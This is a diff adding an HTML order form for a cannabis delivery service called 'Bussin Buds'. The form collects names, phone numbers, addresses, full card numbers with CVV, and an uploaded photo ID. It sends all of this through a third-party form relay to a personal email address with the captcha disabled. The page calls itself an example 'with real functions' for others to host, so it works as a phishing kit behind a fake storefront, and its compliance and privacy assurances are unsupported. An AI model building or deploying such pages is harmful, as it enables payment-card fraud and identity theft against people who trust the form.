@@ -1,0 +1,324 @@
+<html><head><base href="https://unaveragetech.github.io/P_imquire/"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Bussin Buds - Premium Cannabis Order Form</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><style>
+    :root {
+      --primary-color: #006400;
+      --secondary-color: #4CAF50;
+      --accent-color: #8BC34A;
+      --text-color: #333;
+      --bg-color: #F5F5F5;
+    }
+    
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+    }
+    
+    .container {
+      max-width: 800px;
+      margin-top: 50px;
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+    }
+    
+    h1, h2 {
+      color: var(--primary-color);
+      font-weight: 700;
+    }
+    
+    .btn-primary {
+      background-color: var(--primary-color);
+      border: none;
+      transition: all 0.3s ease;
+    }
+    
+    .btn-primary:hover {
+      background-color: var(--secondary-color);
+      transform: translateY(-2px);
+    }
+    
+    .form-control:focus {
+      border-color: var(--accent-color);
+      box-shadow: 0 0 0 0.2rem rgba(76, 175, 80, 0.25);
+    }
+    
+    .footer {
+      margin-top: 50px;
+      padding: 20px;
+      background-color: var(--primary-color);
+      color: #fff;
+      text-align: center;
+    }
+    
+    .footer a {
+      color: var(--accent-color);
+    }
+    
+    .cannabis-leaf {
+      fill: var(--primary-color);
+      width: 50px;
+      height: 50px;
+      margin-bottom: 20px;
+    }
+    
+    .form-check-input:checked {
+      background-color: var(--primary-color);
+      border-color: var(--primary-color);
+    }
+    
+    .custom-file-label::after {
+      content: "Browse";
+    }
+    
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0px); }
+    }
+    
+    .floating {
+      animation: float 3s ease-in-out infinite;
+    }
+  </style></head><body>
+
+  <!-- Header Section -->
+<header class="container text-center mb-5">
+  <svg class="cannabis-leaf floating" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+    <path d="M50 0 C60 20 80 20 90 10 C80 30 80 50 90 70 C70 60 50 70 50 90 C50 70 30 60 10 70 C20 50 20 30 10 10 C20 20 40 20 50 0 Z"/>
+  </svg>
+  <h1 class="display-4">Bussin Buds Order Form</h1>
+  <p class="lead">Experience premium cannabis delivered right to your doorstep. Fill out the form below to place your order.</p>
+  
+  <div class="mt-4">
+    <p>At Bussin Buds, we are dedicated to providing you with an exceptional selection of cannabis products. Our team is committed to ensuring that you receive only the highest quality items that meet your needs. Whether you’re a seasoned connoisseur or a first-time user, we are here to guide you through every step of the ordering process.</p>
+    <p>Your satisfaction is our priority, and we strive to maintain compliance with all regulations to ensure a safe and enjoyable experience. Thank you for choosing Bussin Buds!</p>
+    <p>This is an Example page with real functions (No ORDERS WILL BE ACCEPTED PLEASE HOST ELSEWHERE)</p>
+  </div>
+</header>
+
+
+  <!-- Order Submission Form -->
+  <div class="container">
+    <form target="_blank" action="https://formsubmit.co/Cyberslueth@consultant.com" method="POST" enctype="multipart/form-data">
+      
+      <!-- Full Name, Email, and Phone -->
+      <div class="row mb-4">
+        <div class="col-md-4">
+          <div class="form-floating">
+            <input type="text" name="name" class="form-control" id="floatingName" placeholder="Full Name" required>
+            <label for="floatingName"><i class="fas fa-user"></i> Full Name</label>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="form-floating">
+            <input type="email" name="email" class="form-control" id="floatingEmail" placeholder="Email Address" required>
+            <label for="floatingEmail"><i class="fas fa-envelope"></i> Email Address</label>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="form-floating">
+            <input type="tel" name="phone" class="form-control" id="floatingPhone" placeholder="Phone Number" required>
+            <label for="floatingPhone"><i class="fas fa-phone"></i> Phone Number</label>
+          </div>
+        </div>
+      </div>
+
+      <!-- Pick-up or Delivery -->
+      <div class="mb-4">
+        <label class="form-label">Order Type:</label><br>
+        <div class="btn-group" role="group" aria-label="Order Type">
+          <input type="radio" class="btn-check" name="orderType" id="btnradio1" value="Pick-up" autocomplete="off" required>
+          <label class="btn btn-outline-primary" for="btnradio1"><i class="fas fa-store"></i> Pick-up</label>
+
+          <input type="radio" class="btn-check" name="orderType" id="btnradio2" value="Delivery" autocomplete="off" required>
+          <label class="btn btn-outline-primary" for="btnradio2"><i class="fas fa-truck"></i> Delivery</label>
+        </div>
+      </div>
+
+      <!-- Address for Delivery (hidden until Delivery is selected) -->
+      <div class="mb-4" id="deliveryAddress" style="display:none;">
+        <div class="form-floating">
+          <input type="text" name="address" class="form-control" id="floatingAddress" placeholder="Delivery Address">
+          <label for="floatingAddress"><i class="fas fa-map-marker-alt"></i> Delivery Address</label>
+        </div>
+      </div>
+
+      <!-- Bussin Buds Card Number -->
+      <div class="mb-4">
+        <div class="form-floating">
+          <input type="text" name="bussinBudsCard" class="form-control" id="floatingCard" placeholder="Bussin Buds Card Number" required>
+          <label for="floatingCard"><i class="fas fa-id-card"></i> Bussin Buds Card Number</label>
+        </div>
+      </div>
+
+      <!-- Age Verification -->
+      <div class="mb-4">
+        <div class="form-check">
+          <input class="form-check-input" type="checkbox" name="ageVerification" id="ageCheck" required>
+          <label class="form-check-label" for="ageCheck">
+            I confirm I am 21 years of age or older.
+          </label>
+        </div>
+      </div>
+
+     <!-- Product Selection -->
+<div class="mb-4">
+  <div class="form-floating">
+    <select class="form-select" name="productSelection" id="floatingSelect" required>
+      <option value="" disabled selected>Select your product type</option>
+      <option value="flower">Cannabis Flower</option>
+      <option value="oil">Concentrates (Oils)</option>
+      <option value="edibles">Edibles</option>
+      <option value="custom">Custom Order</option>
+    </select>
+    <label for="floatingSelect"><i class="fas fa-cannabis"></i> Select Product(s)</label>
+  </div>
+  <p class="mt-2">Choose from a diverse range of premium cannabis products tailored to meet your preferences:</p>
+  
+  <ul class="list-group mt-2">
+    <li class="list-group-item">
+      <strong>Cannabis Flower:</strong> Our selection of cannabis flower features a variety of strains, each with unique flavor profiles and effects. Whether you’re looking for something energizing, relaxing, or somewhere in between, our expertly curated strains are sure to satisfy your needs.
+    </li>
+    <li class="list-group-item">
+      <strong>Concentrates (Oils):</strong> Explore our high-quality concentrates, including oils and tinctures, known for their potency and purity. These products are perfect for those seeking a more intense experience and can be used in various ways, including sublingually or in vape pens.
+    </li>
+    <li class="list-group-item">
+      <strong>Edibles:</strong> Indulge in our delicious edibles, from gummies to baked goods, that offer a flavorful way to enjoy cannabis. Each edible is crafted with care, ensuring consistent dosing and delightful taste, perfect for those who prefer a sweet treat.
+    </li>
+    <li class="list-group-item">
+      <strong>Custom Order:</strong> If you have specific preferences or requirements, our custom order option allows you to tailor your experience. Let us know your desired products or specifications, and our team will do their best to accommodate your needs.
+    </li>
+  </ul>
+
+  <p class="mt-2">Feel free to reach out to our knowledgeable staff for assistance in selecting the right product for your needs. We’re here to help ensure you have the best experience possible!</p>
+</div>
+
+
+      <!-- Custom Product Entry -->
+      <div class="mb-4">
+        <div class="form-floating">
+          <textarea class="form-control" placeholder="Custom Product Details (if any)" id="floatingTextarea" name="customProductDetails" style="height: 100px"></textarea>
+          <label for="floatingTextarea"><i class="fas fa-edit"></i> Custom Product Details (if any)</label>
+        </div>
+      </div>
+
+      <!-- Credit Card Information -->
+      <div class="mb-4">
+        <h5><i class="fas fa-credit-card"></i> Payment Information</h5>
+        <div class="row g-3">
+          <div class="col-md-6">
+            <div class="form-floating">
+              <input type="text" name="cardNumber" class="form-control" id="floatingCardNumber" placeholder="Card Number" required>
+              <label for="floatingCardNumber">Card Number</label>
+            </div>
+          </div>
+          <div class="col-md-3">
+            <div class="form-floating">
+              <input type="text" name="cardExpDate" class="form-control" id="floatingExpDate" placeholder="MM/YY" required>
+              <label for="floatingExpDate">Expiration Date (MM/YY)</label>
+            </div>
+          </div>
+          <div class="col-md-3">
+            <div class="form-floating">
+              <input type="text" name="cardCVV" class="form-control" id="floatingCVV" placeholder="CVV" required>
+              <label for="floatingCVV">CVV</label>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ID Upload -->
+      <div class="mb-4">
+        <label for="attachment" class="form-label"><i class="fas fa-upload"></i> Upload Your ID (PNG, JPEG):</label>
+        <input type="file" name="attachment" class="form-control" id="attachment" accept="image/png, image/jpeg" required>
+      </div>
+
+      <!-- Hidden Fields -->
+      <input type="hidden" name="_next" value="https://bussinbuds.com/thanks.html">
+      <input type="hidden" name="_subject" value="New Bussin Buds Order Submission!">
+      <input type="hidden" name="_cc" value="orders@bussinbuds.com,support@bussinbuds.com">
+      <input type="hidden" name="_blacklist" value="spammy pattern, banned term, illegal substance">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_honey" style="display:none">
+      <input type="hidden" name="_autoresponse" value="Thank you for your Bussin Buds order! We're processing it now and will get back to you soon.">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_webhook" value="https://bussinbuds.com/order-webhook">
+
+      <!-- Submit Button -->
+      <button type="submit" class="btn btn-primary btn-lg w-100">
+        <i class="fas fa-paper-plane"></i> Submit Order
+      </button>
+    </form>
+  </div>
+
+ 
+ <!-- About Section -->
+<section class="about container mt-5">
+  <h2><i class="fas fa-leaf"></i> About Bussin Buds</h2>
+  <p class="lead">At Bussin Buds, we're dedicated to delivering premium cannabis products right to your doorstep. Our passion for quality, variety, and customer satisfaction is what sets us apart in this ever-evolving industry. Each product in our collection, from carefully curated strains to expertly crafted edibles, undergoes rigorous quality checks to ensure that it meets our high standards and exceeds your expectations.</p>
+
+  <p>We understand that the cannabis experience is unique for everyone, which is why we offer a diverse range of products designed to cater to different preferences and needs. Whether you are a seasoned connoisseur or a first-time user, our knowledgeable team is here to guide you in selecting the right products. We believe that education is key, so we strive to provide information about our products, their effects, and responsible usage practices.</p>
+
+  <p>At Bussin Buds, we are unwavering in our commitment to operating within the legal framework governing cannabis sales. We carefully adhere to all local, state, and federal regulations, ensuring that our business practices are not only lawful but also ethical. This dedication helps protect our customers, our community, and the integrity of our industry. By promoting responsible cannabis consumption, we aim to foster a safe and enjoyable environment for all who choose to shop with us.</p>
+
+  <p>To further enhance your experience, we utilize trusted third-party delivery services known for their reliability and professionalism. Our delivery partners are specifically trained to handle cannabis products with care, ensuring that every order is transported safely and discreetly. We take your privacy seriously, and our delivery process is designed to maintain confidentiality while providing prompt service. Our goal is to make your shopping experience seamless from start to finish, allowing you to enjoy your favorite products without any hassle.</p>
+
+  <p>We also value customer feedback and continuously seek ways to improve our services. Your satisfaction is our top priority, and we encourage you to reach out with any questions or suggestions. Fill out this form to place an order, and we will ensure prompt processing and delivery. Please ensure the validity of your information, as it is crucial for fulfilling your order. Join us on our journey to redefine the cannabis experience, and thank you for choosing Bussin Buds!</p>
+</section>
+
+
+  <!-- Footer -->
+  <footer class="footer mt-5">
+    <div class="container">
+      <p>&copy; 2021-2024 Bussin Buds | All rights reserved</p>
+      <p><a href="mailto:Cyberslueth@consultant.com"><i class="fas fa-envelope"></i> Contact Us</a></p>
+      <div class="mt-3">
+        <a href="https://facebook.com/bussinbuds" class="me-3"><i class="fab fa-facebook fa-lg"></i></a>
+        <a href="https://instagram.com/bussinbuds" class="me-3"><i class="fab fa-instagram fa-lg"></i></a>
+        <a href="https://twitter.com/bussinbuds"><i class="fab fa-twitter fa-lg"></i></a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.3/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+    // Toggle visibility of delivery address based on order type
+    $("input[name='orderType']").on('change', function() {
+      if ($(this).val() === 'Delivery') {
+        $('#deliveryAddress').slideDown();
+      } else {
+        $('#deliveryAddress').slideUp();
+      }
+    });
+
+    // Form validation
+    (function() {
+      'use strict';
+      window.addEventListener('load', function() {
+        var forms = document.getElementsByClassName('needs-validation');
+        var validation = Array.prototype.filter.call(forms, function(form) {
+          form.addEventListener('submit', function(event) {
+            if (form.checkValidity() === false) {
+              event.preventDefault();
+              event.stopPropagation();
+            }
+            form.classList.add('was-validated');
+          }, false);
+        });
+      }, false);
+    })();
+
+    // Smooth scrolling for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.querySelector(this.getAttribute('href')).scrollIntoView({
+          behavior: 'smooth'
+        });
+      });
+    });
+  </script>
+
+</body></html>
